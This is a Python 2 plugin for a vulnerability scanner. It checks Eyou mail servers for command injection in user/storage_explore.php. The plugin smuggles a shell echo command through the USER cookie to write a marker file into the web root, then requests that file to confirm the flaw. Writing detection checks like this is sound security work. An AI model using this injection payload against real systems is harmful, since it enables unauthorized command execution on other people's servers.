#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        exp1 = "user/storage_explore.php"
        exp2 = "user/nvs_test.txt"
        url1 = url+exp1
        url2 = url+exp2
        headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5","Cookie": "USER=UID=+|+echo+825201d41691d19d7445208bd75bff80+>>/data/eyou/apache/htdocs/user/nvs_test.txt"}
#       res, content = http.request(url1,'GET',headers=headers)
        res, content = yx_httplib2_request(http,url1,'GET',headers=headers)
        if res['status'] == '200':
#           res2, content2 = http.request(url2)
            res2, content2 = yx_httplib2_request(http,url2)
            if res2['status'] == '200' and content2.find('825201d41691d19d7445208bd75bff80')>=0:
                request = getRequest(url2)
                response = getResponse(res2)
                if ob['isstart']=='1':
                    detail="验证性扫描结果：\n%s\n%s"%(url2,detail)
                list.append(getRecord(ob,url2,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:Eyou_storage_explore_CmdExeScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:Eyou_storage_explore_CmdExeScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
